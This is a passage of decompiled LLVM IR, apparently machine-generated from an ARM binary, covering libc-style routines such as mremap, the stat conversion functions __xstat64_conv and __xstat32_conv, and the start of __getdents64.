  %v3_11a60 = add i32 %v2_11a60, %v0_11a5c
  %v4_11a60 = inttoptr i32 %v3_11a60 to i32*
  store i32 %v1_11a54, i32* %v4_11a60, align 4
  %v0_11a68.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11a68

dec_label_pc_11a68:                               ; preds = %dec_label_pc_11a28, %dec_label_pc_11a50
  %v0_11a6c = phi i32 [ %v0_11a38, %dec_label_pc_11a28 ], [ -1, %dec_label_pc_11a50 ]
  %v0_11a68 = phi i32 [ %v0_11a28, %dec_label_pc_11a28 ], [ %v0_11a68.pre, %dec_label_pc_11a50 ]
  store i32 %v0_11a6c, i32* @r7, align 4
  %v1_11a70 = call i32 @__libc_disable_asynccancel(i32 %v0_11a68)
  %v0_11a74.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11a74

dec_label_pc_11a74:                               ; preds = %dec_label_pc_11a20, %dec_label_pc_11a68
  %v0_11a74 = phi i32 [ %v0_11a20, %dec_label_pc_11a20 ], [ %v0_11a74.pre, %dec_label_pc_11a68 ]
  %v2_11a7c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11a7c, i32* @r4, align 4
  store i32 %v12_119bc, i32* @r7, align 4
  ret i32 %v0_11a74

; uselistorder directives
  uselistorder i32 %v0_11a38, { 1, 2, 0 }
  uselistorder i32 %v0_119e0, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_11a74, { 1, 0 }
  uselistorder label %dec_label_pc_11a68, { 1, 0 }
  uselistorder label %dec_label_pc_11a20, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11a98 = load i32, i32* @r4, align 4
  store i32 %v3_11a98, i32* %stack_var_-12, align 4
  %v0_11aa8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11aa8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11aa8, -4095
  br i1 %tmp, label %dec_label_pc_11ad0, label %dec_label_pc_11ab8

dec_label_pc_11ab8:                               ; preds = %entry
  %v0_11abc = call i32 @__aeabi_read_tp()
  %v3_11ac0 = load i16, i16* @global_var_222f0.75, align 2
  %v4_11ac0 = sext i16 %v3_11ac0 to i32
  %v0_11ac4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ac4 = sub i32 0, %v0_11ac4
  store i32 %v1_11ac4, i32* %r2.global-to-local, align 4
  %v3_11ac8 = add i32 %v4_11ac0, %v0_11abc
  %v4_11ac8 = inttoptr i32 %v3_11ac8 to i32*
  store i32 %v1_11ac4, i32* %v4_11ac8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11ad0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11ad0

dec_label_pc_11ad0:                               ; preds = %entry, %dec_label_pc_11ab8
  %v1_11ad4 = phi i32 [ %v0_11aa8, %entry ], [ -1, %dec_label_pc_11ab8 ]
  %v2_11ad0 = phi i32 [ %v3_11a98, %entry ], [ %v2_11ad0.pre, %dec_label_pc_11ab8 ]
  store i32 %v2_11ad0, i32* @r4, align 4
  ret i32 %v1_11ad4

; uselistorder directives
  uselistorder i32 %v0_11aa8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ad0, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_11adc = load i32, i32* @r4, align 4
  store i32 %v3_11adc, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_11af4 = inttoptr i32 %arg2 to i8*
  %v4_11af4 = call i32 @__GI_memset(i8* %v3_11af4, i32 0, i32 104)
  %v2_11af8 = load i32, i32* %arg1, align 4
  store i32 %v2_11af8, i32* %r3.global-to-local, align 4
  %v3_11af8 = add i32 %tmp, 4
  %v4_11af8 = inttoptr i32 %v3_11af8 to i32*
  %v5_11af8 = load i32, i32* %v4_11af8, align 4
  store i32 %v5_11af8, i32* %r4.global-to-local, align 4
  %v0_11afc = load i32, i32* %r5.global-to-local, align 4
  %v1_11afc = inttoptr i32 %v0_11afc to i32*
  store i32 %v2_11af8, i32* %v1_11afc, align 4
  %v3_11afc = add i32 %v0_11afc, 4
  %v4_11afc = inttoptr i32 %v3_11afc to i32*
  %v5_11afc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_11afc, i32* %v4_11afc, align 4
  %v0_11b00 = load i32, i32* %r6.global-to-local, align 4
  %v1_11b00 = add i32 %v0_11b00, 12
  %v2_11b00 = inttoptr i32 %v1_11b00 to i32*
  %v3_11b00 = load i32, i32* %v2_11b00, align 4
  %v1_11b04 = load i32, i32* %r5.global-to-local, align 4
  %v2_11b04 = add i32 %v1_11b04, 12
  %v3_11b04 = inttoptr i32 %v2_11b04 to i32*
  store i32 %v3_11b00, i32* %v3_11b04, align 4
  %v0_11b08 = load i32, i32* %r6.global-to-local, align 4
  %v1_11b08 = add i32 %v0_11b08, 96
  store i32 %v1_11b08, i32* %r3.global-to-local, align 4
  %v1_11b0c = inttoptr i32 %v1_11b08 to i32*
  %v2_11b0c = load i32, i32* %v1_11b0c, align 4
  store i32 %v2_11b0c, i32* %r3.global-to-local, align 4
  %v3_11b0c = add i32 %v0_11b08, 100
  %v4_11b0c = inttoptr i32 %v3_11b0c to i32*
  %v5_11b0c = load i32, i32* %v4_11b0c, align 4
  store i32 %v5_11b0c, i32* %r4.global-to-local, align 4
  %v1_11b10 = add i32 %v0_11b08, 56
  %v2_11b10 = inttoptr i32 %v1_11b10 to i32*
  %v3_11b10 = load i32, i32* %v2_11b10, align 4
  store i32 %v3_11b10, i32* %r2.global-to-local, align 4
  %v1_11b14 = load i32, i32* %r5.global-to-local, align 4
  %v2_11b14 = add i32 %v1_11b14, 96
  %v3_11b14 = inttoptr i32 %v2_11b14 to i32*
  store i32 %v2_11b0c, i32* %v3_11b14, align 4
  %v0_11b18 = load i32, i32* %r4.global-to-local, align 4
  %v1_11b18 = load i32, i32* %r5.global-to-local, align 4
  %v2_11b18 = add i32 %v1_11b18, 100
  %v3_11b18 = inttoptr i32 %v2_11b18 to i32*
  store i32 %v0_11b18, i32* %v3_11b18, align 4
  %v0_11b1c = load i32, i32* %r6.global-to-local, align 4
  %v1_11b1c = add i32 %v0_11b1c, 24
  store i32 %v1_11b1c, i32* %ip.global-to-local, align 4
  %v1_11b20 = inttoptr i32 %v1_11b1c to i32*
  %v2_11b20 = load i32, i32* %v1_11b20, align 4
  store i32 %v2_11b20, i32* %ip.global-to-local, align 4
  %v3_11b20 = add i32 %v0_11b1c, 28
  %v4_11b20 = inttoptr i32 %v3_11b20 to i32*
  %v5_11b20 = load i32, i32* %v4_11b20, align 4
  store i32 %v5_11b20, i32* %lr.global-to-local, align 4
  %v0_11b24 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b24 = load i32, i32* %r5.global-to-local, align 4
  %v2_11b24 = add i32 %v1_11b24, 56
  %v3_11b24 = inttoptr i32 %v2_11b24 to i32*
  store i32 %v0_11b24, i32* %v3_11b24, align 4
  %v0_11b28 = load i32, i32* %r6.global-to-local, align 4
  %v1_11b28 = add i32 %v0_11b28, 72
  store i32 %v1_11b28, i32* %r3.global-to-local, align 4
  %v1_11b2c = add i32 %v0_11b28, 32
  store i32 %v1_11b2c, i32* %r7.global-to-local, align 4
  %v1_11b30 = inttoptr i32 %v1_11b2c to i32*
  %v2_11b30 = load i32, i32* %v1_11b30, align 4
  store i32 %v2_11b30, i32* %r7.global-to-local, align 4
  %v3_11b30 = add i32 %v0_11b28, 36
  %v4_11b30 = inttoptr i32 %v3_11b30 to i32*
  %v5_11b30 = load i32, i32* %v4_11b30, align 4
  store i32 %v5_11b30, i32* %r8.global-to-local, align 4
  %v1_11b34 = inttoptr i32 %v1_11b28 to i32*
  %v2_11b34 = load i32, i32* %v1_11b34, align 4
  %v3_11b34 = add i32 %v0_11b28, 76
  %v4_11b34 = inttoptr i32 %v3_11b34 to i32*
  %v5_11b34 = load i32, i32* %v4_11b34, align 4
  store i32 %v5_11b34, i32* %r1.global-to-local, align 4
  %v0_11b38 = load i32, i32* %r5.global-to-local, align 4
  %v1_11b38 = add i32 %v0_11b38, 72
  %v1_11b3c = inttoptr i32 %v1_11b38 to i32*
  store i32 %v2_11b34, i32* %v1_11b3c, align 4
  %v3_11b3c = add i32 %v0_11b38, 76
  %v4_11b3c = inttoptr i32 %v3_11b3c to i32*
  %v5_11b3c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11b3c, i32* %v4_11b3c, align 4
  %v0_11b40 = load i32, i32* %r7.global-to-local, align 4
  %v1_11b40 = load i32, i32* %r5.global-to-local, align 4
  %v2_11b40 = add i32 %v1_11b40, 32
  %v3_11b40 = inttoptr i32 %v2_11b40 to i32*
  store i32 %v0_11b40, i32* %v3_11b40, align 4
  %v0_11b44 = load i32, i32* %r8.global-to-local, align 4
  %v1_11b44 = load i32, i32* %r5.global-to-local, align 4
  %v2_11b44 = add i32 %v1_11b44, 36
  %v3_11b44 = inttoptr i32 %v2_11b44 to i32*
  store i32 %v0_11b44, i32* %v3_11b44, align 4
  %v0_11b48 = load i32, i32* %r6.global-to-local, align 4
  %v1_11b48 = add i32 %v0_11b48, 80
  store i32 %v1_11b48, i32* %r3.global-to-local, align 4
  %v1_11b4c = add i32 %v0_11b48, 48
  store i32 %v1_11b4c, i32* %r7.global-to-local, align 4
  %v1_11b50 = inttoptr i32 %v1_11b4c to i32*
  %v2_11b50 = load i32, i32* %v1_11b50, align 4
  store i32 %v2_11b50, i32* %r7.global-to-local, align 4
  %v3_11b50 = add i32 %v0_11b48, 52
  %v4_11b50 = inttoptr i32 %v3_11b50 to i32*
  %v5_11b50 = load i32, i32* %v4_11b50, align 4
  store i32 %v5_11b50, i32* %r8.global-to-local, align 4
  %v1_11b54 = inttoptr i32 %v1_11b48 to i32*
  %v2_11b54 = load i32, i32* %v1_11b54, align 4
  %v3_11b54 = add i32 %v0_11b48, 84
  %v4_11b54 = inttoptr i32 %v3_11b54 to i32*
  %v5_11b54 = load i32, i32* %v4_11b54, align 4
  store i32 %v5_11b54, i32* %r1.global-to-local, align 4
  %v1_11b58 = add i32 %v0_11b48, 16
  %v2_11b58 = inttoptr i32 %v1_11b58 to i32*
  %v3_11b58 = load i32, i32* %v2_11b58, align 4
  store i32 %v3_11b58, i32* %r2.global-to-local, align 4
  %v0_11b5c = load i32, i32* %r5.global-to-local, align 4
  %v1_11b5c = add i32 %v0_11b5c, 80
  %v1_11b60 = inttoptr i32 %v1_11b5c to i32*
  store i32 %v2_11b54, i32* %v1_11b60, align 4
  %v3_11b60 = add i32 %v0_11b5c, 84
  %v4_11b60 = inttoptr i32 %v3_11b60 to i32*
  %v5_11b60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11b60, i32* %v4_11b60, align 4
  %v0_11b64 = load i32, i32* %r7.global-to-local, align 4
  %v1_11b64 = load i32, i32* %r5.global-to-local, align 4
  %v2_11b64 = add i32 %v1_11b64, 48
  %v3_11b64 = inttoptr i32 %v2_11b64 to i32*
  store i32 %v0_11b64, i32* %v3_11b64, align 4
  %v0_11b68 = load i32, i32* %r8.global-to-local, align 4
  %v1_11b68 = load i32, i32* %r5.global-to-local, align 4
  %v2_11b68 = add i32 %v1_11b68, 52
  %v3_11b68 = inttoptr i32 %v2_11b68 to i32*
  store i32 %v0_11b68, i32* %v3_11b68, align 4
  %v0_11b6c = load i32, i32* %r2.global-to-local, align 4
  %v1_11b6c = load i32, i32* %r5.global-to-local, align 4
  %v2_11b6c = add i32 %v1_11b6c, 16
  %v3_11b6c = inttoptr i32 %v2_11b6c to i32*
  store i32 %v0_11b6c, i32* %v3_11b6c, align 4
  %v0_11b70 = load i32, i32* %r6.global-to-local, align 4
  %v1_11b70 = add i32 %v0_11b70, 88
  store i32 %v1_11b70, i32* %r3.global-to-local, align 4
  %v1_11b74 = add i32 %v0_11b70, 20
  %v2_11b74 = inttoptr i32 %v1_11b74 to i32*
  %v3_11b74 = load i32, i32* %v2_11b74, align 4
  store i32 %v3_11b74, i32* %r2.global-to-local, align 4
  %v1_11b78 = inttoptr i32 %v1_11b70 to i32*
  %v2_11b78 = load i32, i32* %v1_11b78, align 4
  %v3_11b78 = add i32 %v0_11b70, 92
  %v4_11b78 = inttoptr i32 %v3_11b78 to i32*
  %v5_11b78 = load i32, i32* %v4_11b78, align 4
  store i32 %v5_11b78, i32* %r1.global-to-local, align 4
  %v1_11b7c = add i32 %v0_11b70, 64
  store i32 %v1_11b7c, i32* %r6.global-to-local, align 4
  %v1_11b80 = inttoptr i32 %v1_11b7c to i32*
  %v2_11b80 = load i32, i32* %v1_11b80, align 4
  store i32 %v2_11b80, i32* %r6.global-to-local, align 4
  %v3_11b80 = add i32 %v0_11b70, 68
  %v4_11b80 = inttoptr i32 %v3_11b80 to i32*
  %v5_11b80 = load i32, i32* %v4_11b80, align 4
  store i32 %v5_11b80, i32* %r7.global-to-local, align 4
  %v0_11b84 = load i32, i32* %r5.global-to-local, align 4
  %v1_11b84 = add i32 %v0_11b84, 88
  store i32 %v1_11b84, i32* %r3.global-to-local, align 4
  %v2_11b88 = add i32 %v0_11b84, 20
  %v3_11b88 = inttoptr i32 %v2_11b88 to i32*
  store i32 %v3_11b74, i32* %v3_11b88, align 4
  %v0_11b8c = load i32, i32* %ip.global-to-local, align 4
  %v1_11b8c = load i32, i32* %r5.global-to-local, align 4
  %v2_11b8c = add i32 %v1_11b8c, 24
  %v3_11b8c = inttoptr i32 %v2_11b8c to i32*
  store i32 %v0_11b8c, i32* %v3_11b8c, align 4
  %v0_11b90 = load i32, i32* %lr.global-to-local, align 4
  %v1_11b90 = load i32, i32* %r5.global-to-local, align 4
  %v2_11b90 = add i32 %v1_11b90, 28
  %v3_11b90 = inttoptr i32 %v2_11b90 to i32*
  store i32 %v0_11b90, i32* %v3_11b90, align 4
  %v0_11b94 = load i32, i32* %r6.global-to-local, align 4
  %v1_11b94 = load i32, i32* %r5.global-to-local, align 4
  %v2_11b94 = add i32 %v1_11b94, 64
  %v3_11b94 = inttoptr i32 %v2_11b94 to i32*
  store i32 %v0_11b94, i32* %v3_11b94, align 4
  %v0_11b98 = load i32, i32* %r7.global-to-local, align 4
  %v1_11b98 = load i32, i32* %r5.global-to-local, align 4
  %v2_11b98 = add i32 %v1_11b98, 68
  %v3_11b98 = inttoptr i32 %v2_11b98 to i32*
  store i32 %v0_11b98, i32* %v3_11b98, align 4
  %v0_11b9c = load i32, i32* %r3.global-to-local, align 4
  %v1_11b9c = inttoptr i32 %v0_11b9c to i32*
  store i32 %v2_11b78, i32* %v1_11b9c, align 4
  %v3_11b9c = add i32 %v0_11b9c, 4
  %v4_11b9c = inttoptr i32 %v3_11b9c to i32*
  %v5_11b9c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11b9c, i32* %v4_11b9c, align 4
  %v2_11ba0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11ba0, i32* %r4.global-to-local, align 4
  ret i32 %v2_11b78

; uselistorder directives
  uselistorder i32 %v0_11b70, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_11b48, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 104, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_11ba8 = load i32, i32* @r4, align 4
  store i32 %v3_11ba8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_11bc0 = inttoptr i32 %arg2 to i8*
  %v4_11bc0 = call i32 @__GI_memset(i8* %v3_11bc0, i32 0, i32 88)
  %v2_11bc4 = load i32, i32* %arg1, align 4
  %v3_11bc4 = add i32 %tmp, 4
  %v4_11bc4 = inttoptr i32 %v3_11bc4 to i32*
  %v5_11bc4 = load i32, i32* %v4_11bc4, align 4
  store i32 %v5_11bc4, i32* %r4.global-to-local, align 4
  %v0_11bc8 = load i32, i32* %r6.global-to-local, align 4
  %v1_11bc8 = inttoptr i32 %v0_11bc8 to i32*
  store i32 %v2_11bc4, i32* %v1_11bc8, align 4
  %v3_11bc8 = add i32 %v0_11bc8, 4
  %v4_11bc8 = inttoptr i32 %v3_11bc8 to i32*
  %v5_11bc8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_11bc8, i32* %v4_11bc8, align 4
  %v0_11bcc = load i32, i32* %r5.global-to-local, align 4
  %v1_11bcc = add i32 %v0_11bcc, 32
  %v1_11bd0 = inttoptr i32 %v1_11bcc to i32*
  %v2_11bd0 = load i32, i32* %v1_11bd0, align 4
  %v3_11bd0 = add i32 %v0_11bcc, 36
  %v4_11bd0 = inttoptr i32 %v3_11bd0 to i32*
  %v5_11bd0 = load i32, i32* %v4_11bd0, align 4
  store i32 %v5_11bd0, i32* %r4.global-to-local, align 4
  %v1_11bd4 = add i32 %v0_11bcc, 96
  %v2_11bd4 = inttoptr i32 %v1_11bd4 to i32*
  %v3_11bd4 = load i32, i32* %v2_11bd4, align 4
  store i32 %v3_11bd4, i32* %r2.global-to-local, align 4
  %v1_11bd8 = load i32, i32* %r6.global-to-local, align 4
  %v2_11bd8 = add i32 %v1_11bd8, 32
  %v3_11bd8 = inttoptr i32 %v2_11bd8 to i32*
  store i32 %v2_11bd0, i32* %v3_11bd8, align 4
  %v0_11bdc = load i32, i32* %r4.global-to-local, align 4
  %v1_11bdc = load i32, i32* %r6.global-to-local, align 4
  %v2_11bdc = add i32 %v1_11bdc, 36
  %v3_11bdc = inttoptr i32 %v2_11bdc to i32*
  store i32 %v0_11bdc, i32* %v3_11bdc, align 4
  %v0_11be0 = load i32, i32* %r2.global-to-local, align 4
  %v1_11be0 = load i32, i32* %r6.global-to-local, align 4
  %v2_11be0 = add i32 %v1_11be0, 12
  %v3_11be0 = inttoptr i32 %v2_11be0 to i32*
  store i32 %v0_11be0, i32* %v3_11be0, align 4
  %v0_11be4 = load i32, i32* %r5.global-to-local, align 4
  %v1_11be4 = add i32 %v0_11be4, 48
  %v2_11be4 = inttoptr i32 %v1_11be4 to i32*
  %v3_11be4 = load i32, i32* %v2_11be4, align 4
  %v1_11be8 = add i32 %v0_11be4, 24
  store i32 %v1_11be8, i32* %ip.global-to-local, align 4
  %v1_11bec = inttoptr i32 %v1_11be8 to i32*
  %v2_11bec = load i32, i32* %v1_11bec, align 4
  store i32 %v2_11bec, i32* %ip.global-to-local, align 4
  %v3_11bec = add i32 %v0_11be4, 28
  %v4_11bec = inttoptr i32 %v3_11bec to i32*
  %v5_11bec = load i32, i32* %v4_11bec, align 4
  store i32 %v5_11bec, i32* %lr.global-to-local, align 4
  %v1_11bf0 = load i32, i32* %r6.global-to-local, align 4
  %v2_11bf0 = add i32 %v1_11bf0, 44
  %v3_11bf0 = inttoptr i32 %v2_11bf0 to i32*
  store i32 %v3_11be4, i32* %v3_11bf0, align 4
  %v0_11bf4 = load i32, i32* %r5.global-to-local, align 4
  %v1_11bf4 = add i32 %v0_11bf4, 64
  %v2_11bf4 = inttoptr i32 %v1_11bf4 to i32*
  %v3_11bf4 = load i32, i32* %v2_11bf4, align 4
  %v1_11bf8 = add i32 %v0_11bf4, 56
  %v2_11bf8 = inttoptr i32 %v1_11bf8 to i32*
  %v3_11bf8 = load i32, i32* %v2_11bf8, align 4
  store i32 %v3_11bf8, i32* %r2.global-to-local, align 4
  %v1_11bfc = load i32, i32* %r6.global-to-local, align 4
  %v2_11bfc = add i32 %v1_11bfc, 52
  %v3_11bfc = inttoptr i32 %v2_11bfc to i32*
  store i32 %v3_11bf4, i32* %v3_11bfc, align 4
  %v0_11c00 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c00 = load i32, i32* %r6.global-to-local, align 4
  %v2_11c00 = add i32 %v1_11c00, 48
  %v3_11c00 = inttoptr i32 %v2_11c00 to i32*
  store i32 %v0_11c00, i32* %v3_11c00, align 4
  %v0_11c04 = load i32, i32* %r5.global-to-local, align 4
  %v1_11c04 = add i32 %v0_11c04, 72
  %v1_11c08 = inttoptr i32 %v1_11c04 to i32*
  %v2_11c08 = load i32, i32* %v1_11c08, align 4
  %v3_11c08 = add i32 %v0_11c04, 76
  %v4_11c08 = inttoptr i32 %v3_11c08 to i32*
  %v5_11c08 = load i32, i32* %v4_11c08, align 4
  store i32 %v5_11c08, i32* %r1.global-to-local, align 4
  %v0_11c0c = load i32, i32* %r6.global-to-local, align 4
  %v1_11c0c = add i32 %v0_11c0c, 56
  %v1_11c10 = inttoptr i32 %v1_11c0c to i32*
  store i32 %v2_11c08, i32* %v1_11c10, align 4
  %v3_11c10 = add i32 %v0_11c0c, 60
  %v4_11c10 = inttoptr i32 %v3_11c10 to i32*
  %v5_11c10 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11c10, i32* %v4_11c10, align 4
  %v0_11c14 = load i32, i32* %r5.global-to-local, align 4
  %v1_11c14 = add i32 %v0_11c14, 80
  %v1_11c18 = inttoptr i32 %v1_11c14 to i32*
  %v2_11c18 = load i32, i32* %v1_11c18, align 4
  %v3_11c18 = add i32 %v0_11c14, 84
  %v4_11c18 = inttoptr i32 %v3_11c18 to i32*
  %v5_11c18 = load i32, i32* %v4_11c18, align 4
  store i32 %v5_11c18, i32* %r1.global-to-local, align 4
  %v0_11c1c = load i32, i32* %r6.global-to-local, align 4
  %v1_11c1c = add i32 %v0_11c1c, 64
  %v1_11c20 = inttoptr i32 %v1_11c1c to i32*
  store i32 %v2_11c18, i32* %v1_11c20, align 4
  %v3_11c20 = add i32 %v0_11c1c, 68
  %v4_11c20 = inttoptr i32 %v3_11c20 to i32*
  %v5_11c20 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11c20, i32* %v4_11c20, align 4
  %v0_11c24 = load i32, i32* %r5.global-to-local, align 4
  %v1_11c24 = add i32 %v0_11c24, 16
  %v2_11c24 = inttoptr i32 %v1_11c24 to i32*
  %v3_11c24 = load i32, i32* %v2_11c24, align 4
  %v1_11c28 = load i32, i32* %r6.global-to-local, align 4
  %v2_11c28 = add i32 %v1_11c28, 16
  %v3_11c28 = inttoptr i32 %v2_11c28 to i32*
  store i32 %v3_11c24, i32* %v3_11c28, align 4
  %v0_11c2c = load i32, i32* %r5.global-to-local, align 4
  %v1_11c2c = add i32 %v0_11c2c, 88
  %v1_11c30 = add i32 %v0_11c2c, 20
  %v2_11c30 = inttoptr i32 %v1_11c30 to i32*
  %v3_11c30 = load i32, i32* %v2_11c30, align 4
  store i32 %v3_11c30, i32* %r2.global-to-local, align 4
  %v1_11c34 = inttoptr i32 %v1_11c2c to i32*
  %v2_11c34 = load i32, i32* %v1_11c34, align 4
  %v3_11c34 = add i32 %v0_11c2c, 92
  %v4_11c34 = inttoptr i32 %v3_11c34 to i32*
  %v5_11c34 = load i32, i32* %v4_11c34, align 4
  store i32 %v5_11c34, i32* %r1.global-to-local, align 4
  %v0_11c38 = load i32, i32* %r6.global-to-local, align 4
  %v1_11c38 = add i32 %v0_11c38, 72
  %v1_11c3c = inttoptr i32 %v1_11c38 to i32*
  store i32 %v2_11c34, i32* %v1_11c3c, align 4
  %v3_11c3c = add i32 %v0_11c38, 76
  %v4_11c3c = inttoptr i32 %v3_11c3c to i32*
  %v5_11c3c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11c3c, i32* %v4_11c3c, align 4
  %v0_11c40 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c40 = load i32, i32* %r6.global-to-local, align 4
  %v2_11c40 = add i32 %v1_11c40, 20
  %v3_11c40 = inttoptr i32 %v2_11c40 to i32*
  store i32 %v0_11c40, i32* %v3_11c40, align 4
  %v0_11c44 = load i32, i32* %ip.global-to-local, align 4
  %v1_11c44 = load i32, i32* %r6.global-to-local, align 4
  %v2_11c44 = add i32 %v1_11c44, 24
  %v3_11c44 = inttoptr i32 %v2_11c44 to i32*
  store i32 %v0_11c44, i32* %v3_11c44, align 4
  %v0_11c48 = load i32, i32* %lr.global-to-local, align 4
  %v1_11c48 = load i32, i32* %r6.global-to-local, align 4
  %v2_11c48 = add i32 %v1_11c48, 28
  %v3_11c48 = inttoptr i32 %v2_11c48 to i32*
  store i32 %v0_11c48, i32* %v3_11c48, align 4
  %v2_11c4c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11c4c, i32* %r4.global-to-local, align 4
  ret i32 %v2_11c34

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_11c58 = load i32, i32* @r5, align 4
  %v12_11c58 = load i32, i32* @r7, align 4
  %v1_11c5c = add i32 %arg3, 14
  %v2_11c64 = ptrtoint i32* %stack_var_-72 to i32
  %v1_11c68 = and i32 %v1_11c5c, -8
  %v2_11c6c = sub i32 %v2_11c64, %v1_11c68
  %v1_11c70 = add i32 %v2_11c6c, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_11cb4, label %dec_label_pc_11c98

dec_label_pc_11c98:                               ; preds = %entry
  %v1_11c9c = sub i32 0, %arg1
  %v3_11ca0 = load i16, i16* @global_var_222f0.75, align 2
  %v4_11ca0 = sext i16 %v3_11ca0 to i32
  %v0_11ca4 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_11cac = add i32 %v4_11ca0, %v0_11ca4
  %v4_11cac = inttoptr i32 %v3_11cac to i32*
  store i32 %v1_11c9c, i32* %v4_11cac, align 4
  br label %dec_label_pc_11d84

dec_label_pc_11cb4:                               ; preds = %entry
  br i1 false, label %dec_label_pc_11d84, label %dec_label_pc_11cbc

dec_label_pc_11cbc:                               ; preds = %dec_label_pc_11cb4
  %v2_11cbc = add i32 %v1_11c70, %arg1
  store i32 %v2_11cbc, i32* %r1.global-to-local, align 4
  %v2_11cc0 = add i32 %tmp, %arg3
  store i32 %v1_11c70, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11d6c

dec_label_pc_11cdc:                               ; preds = %dec_label_pc_11d6c
  %v1_11cdc = add i32 %v0_11d3c, 16
  %v2_11cdc = inttoptr i32 %v1_11cdc to i16*
  %v3_11cdc = load i16, i16* %v2_11cdc, align 2
  %v4_11cdc = zext i16 %v3_11cdc to i32
  %v1_11ce0 = add nsw i32 %v4_11cdc, -19
  store i32 %v1_11ce0, i32* @r2, align 4
  %v1_11ce4 = add nuw nsw i32 %v4_11cdc, 7
  %v1_11ce8 = and i32 %v1_11ce4, 131064
  store i32 %v1_11ce8, i32* @ip, align 4
  %v2_11cf0 = add i32 %v1_11ce8, %v0_11d44
  store i32 %v2_11cf0, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_11cf0, %v2_11cc0
  br i1 %tmp24, label %dec_label_pc_11cfc, label %dec_label_pc_11d38

dec_label_pc_11cfc:                               ; preds = %dec_label_pc_11cdc
  store i32 0, i32* %r1.global-to-local, align 4
